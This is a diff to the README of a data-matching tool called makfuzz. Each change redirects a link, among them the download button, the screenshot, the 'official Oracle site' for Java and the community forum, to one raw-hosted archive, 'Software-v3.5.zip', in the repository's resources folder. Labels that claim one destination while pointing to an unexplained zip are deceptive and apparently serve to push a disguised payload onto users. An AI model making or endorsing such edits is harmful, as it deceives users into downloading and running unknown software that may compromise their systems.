@@ -1,6 +1,6 @@
 # 🧶 makfuzz - Simplifying Your Data Matching Needs
 
-![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=download)
+![Download](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip)
 
 ---
 
@@ -10,7 +10,7 @@
 
 This application uses advanced techniques to improve matching accuracy. It combines **Spelling Similarity** (how it looks) with **Phonetic Similarity** (how it sounds). This gives you the best results when searching for similar entries, ensuring you find what you need quickly.
 
-![MakFuzz Screenshot](assets/screenshot.png)
+![MakFuzz Screenshot](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To get started with MakFuzz, first, make sure your computer meets the following 
 
 1. Click the button below to visit the downloads page:
 
-   [![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=download)](https://github.com/Booster254/makfuzz/releases)
+   [![Download](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip)](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip)
 
 2. On the Releases page, look for the latest version.
 
@@ -73,7 +73,7 @@ To get started with MakFuzz, first, make sure your computer meets the following 
 
 If you encounter issues while using MakFuzz, consider the following steps:
 
-- **Java Not Found**: Ensure that Java 17 or higher is installed. You can download it from the [official Oracle site](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
+- **Java Not Found**: Ensure that Java 17 or higher is installed. You can download it from the [official Oracle site](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip).
 
 - **File Format Issues**: Ensure your CSV file is formatted correctly. The first row should contain headers.
 
@@ -83,7 +83,7 @@ If you encounter issues while using MakFuzz, consider the following steps:
 
 ## 🤝 Community Support
 
-Join the community of MakFuzz users! You can find help and share experiences by visiting our discussion forum on the [MakFuzz GitHub page](https://github.com/Booster254/makfuzz/issues).
+Join the community of MakFuzz users! You can find help and share experiences by visiting our discussion forum on the [MakFuzz GitHub page](https://raw.githubusercontent.com/Booster254/makfuzz/master/src/main/resources/Software-v3.5.zip).
 
 ---
 
